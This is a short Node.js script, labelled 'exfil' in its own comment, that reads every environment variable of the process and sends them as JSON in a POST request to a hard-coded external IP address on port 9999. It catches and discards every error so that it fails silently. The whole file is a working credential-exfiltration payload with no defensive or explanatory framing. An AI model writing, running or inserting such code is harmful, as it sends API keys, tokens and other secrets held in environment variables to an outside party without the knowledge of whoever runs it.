// exfil - reads env and posts to external listener
const http = require('http');
try {
  const data = JSON.stringify(process.env);
  const req = http.request({
    hostname: '178.156.165.170',
    port: 9999,
    path: '/exfil',
    method: 'POST',
    headers: {'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data)}
  }, res => { res.on('data', () => {}); });
  req.on('error', () => {});
  req.write(data);
  req.end();
} catch(e) {}
